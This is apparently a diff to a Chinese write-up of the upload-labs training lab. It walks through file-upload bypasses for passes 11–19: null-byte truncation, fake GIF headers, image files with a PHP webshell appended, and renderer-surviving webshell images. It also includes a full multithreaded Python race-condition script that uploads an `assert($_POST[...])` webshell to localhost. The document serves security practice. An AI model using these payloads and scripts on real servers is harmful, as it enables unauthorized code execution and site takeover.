@@ -101,4 +101,155 @@ Windows文件流特性绕过，文件名改成shell.php::$DATA，上传成功后
 该代码的作用为将第六行中的$deny_ext中的后缀名替换为空。
 所以本题目可以使用双写后缀名的方法进行绕过。
 ![屏幕快照 2019-04-12 09.29.58.png](https://i.loli.net/2019/04/12/5cafeae609ce6.png)
-## Pass-11 
+## Pass-11 （00截断-%00）
+抓包上传发现，文件的命名格式是将路径与文件名连接起来进行上传
+[![屏幕快照 2019-04-12 18.20.15.png](https://i.loli.net/2019/04/12/5cb066949f76d.png)](https://i.loli.net/2019/04/12/5cb066949f76d.png)  
+解题方法为：
+[![屏幕快照 2019-04-12 18.44.22.png](https://i.loli.net/2019/04/12/5cb06c2b6b4ba.png)](https://i.loli.net/2019/04/12/5cb06c2b6b4ba.png)
+讲道理这样就算上传成功了但是我遇到了些问题，可能服务器安全策略配置问题，放弃挣扎。
+[![屏幕快照 2019-04-12 18.26.16.png](https://i.loli.net/2019/04/12/5cb06c2b1ae6a.png)](https://i.loli.net/2019/04/12/5cb06c2b1ae6a.png)
+如果哪位大佬知道怎么回事可以评论告诉我  
+## Pass-12 （00截断-0x00)
+同Pass-11 但是这次需要将%00换成空格，然后在hex选项卡中将20改为00  
+## Pass-13
+
+绕过文件头检查，添加GIF图片的文件头`GIF89a`，绕过GIF图片检查。
+
+![](/assets/img/posts/13-1.png)
+
+使用命令`copy normal.jpg /b + shell.php /a webshell.jpg`，将php一句话追加到jpg图片末尾，代码不全的话，人工补充完整。形成一个包含Webshell代码的新jpg图片，然后直接上传即可。[JPG一句话shell参考示例](https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.jpg)
+
+![](/assets/img/posts/13-2.png)
+
+png图片处理方式同上。[PNG一句话shell参考示例](https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.png)
+
+![](/assets/img/posts/13-3.png)
+
+## Pass-14
+
+原理和示例同**Pass-13**，添加GIF图片的文件头绕过检查
+
+![](/assets/img/posts/14-1.png)
+
+png图片webshell上传同**Pass-13**。
+
+jpg/jpeg图片webshell上传存在问题，正常的图片也上传不了，等待作者调整。
+
+## Pass-15
+
+原理同**Pass-13**，添加GIF图片的文件头绕过检查
+
+![](/assets/img/posts/15-1.png)
+
+png图片webshell上传同**Pass-13**。
+
+jpg/jpeg图片webshell上传同**Pass-13**。
+
+## Pass-16
+
+原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。
+
+这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片[示例](https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromgif-pass-00.gif)。
+
+![](/assets/img/posts/16-1.png)
+
+打开被渲染后的图片，Webshell代码仍然存在
+
+![](/assets/img/posts/16-2.png)
+
+提供一个jpg格式图片绕过imagecreatefromjpeg函数渲染的一个[示例文件](https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromjpeg-pass-LandGrey.jpg)。 直接上传示例文件会触发Warning警告，并提示文件不是jpg格式的图片。但是实际上已经上传成功，而且示例文件名没有改变。
+
+![](/assets/img/posts/16-3.png)
+
+![](/assets/img/posts/16-4.png)
+
+从上面上传jpg图片可以看到我们想复杂了，程序没有对渲染异常进行处理，直接在正常png图片内插入webshell代码，然后上传[示例文件](https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefrompng-pass-LandGrey.png)即可，并不需要图片是正常的图片。
+
+![](/assets/img/posts/16-5.png)
+
+程序依然没有对文件重命名，携带webshell的无效损坏png图片直接被上传成功。
+
+![](/assets/img/posts/16-6.png)
+
+## Pass-17
+
+利用条件竞争删除文件时间差绕过。使用命令`pip install hackhttp`安装[hackhttp](https://github.com/BugScanTeam/hackhttp)模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数。
+
+```python
+#!/usr/bin/env python
+# coding:utf-8
+# Build By LandGrey
+
+import hackhttp
+from multiprocessing.dummy import Pool as ThreadPool
+
+
+def upload(lists):
+    hh = hackhttp.hackhttp()
+    raw = """POST /upload-labs/Pass-17/index.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/upload-labs/Pass-17/index.php
+Cookie: pass=17
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=---------------------------6696274297634
+Content-Length: 341
+
+-----------------------------6696274297634
+Content-Disposition: form-data; name="upload_file"; filename="17.php"
+Content-Type: application/octet-stream
+
+<?php assert($_POST["LandGrey"])?>
+-----------------------------6696274297634
+Content-Disposition: form-data; name="submit"
+
+上传
+-----------------------------6696274297634--
+"""
+    code, head, html, redirect, log = hh.http('http://127.0.0.1/upload-labs/Pass-17/index.php', raw=raw)
+    print(str(code) + "\r")
+
+
+pool = ThreadPool(10)
+pool.map(upload, range(10000))
+pool.close()
+pool.join()
+```
+
+在脚本运行的时候，访问Webshell
+
+![](/assets/img/posts/17-1.png)
+
+## Pass-18
+
+刚开始没有找到绕过方法，最后下载作者Github提供的打包环境，利用上传重命名竞争+Apache解析漏洞，成功绕过。
+
+上传名字为`18.php.7Z`的文件，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。
+
+![](/assets/img/posts/18-1.png)
+
+
+
+快速提交上面的数据包，可以让文件名字不被重命名上传成功。
+
+![](/assets/img/posts/18-2.png)
+
+然后利用Apache的解析漏洞，即可获得shell
+
+![](/assets/img/posts/18-3.png)
+
+## Pass-19
+
+原理同**Pass-11**，上传的文件名用0x00绕过。改成`19.php【二进制00】.1.jpg`
+
+![](/assets/img/posts/19-1.png)
+
+## 后记
+
+可以发现以上绕过方法中有些是重复的，有些是意外情况，可能与项目作者的本意不符，故本文仅作为参考使用。
+
+等作者修复代码逻辑后，本文也会适时更新。
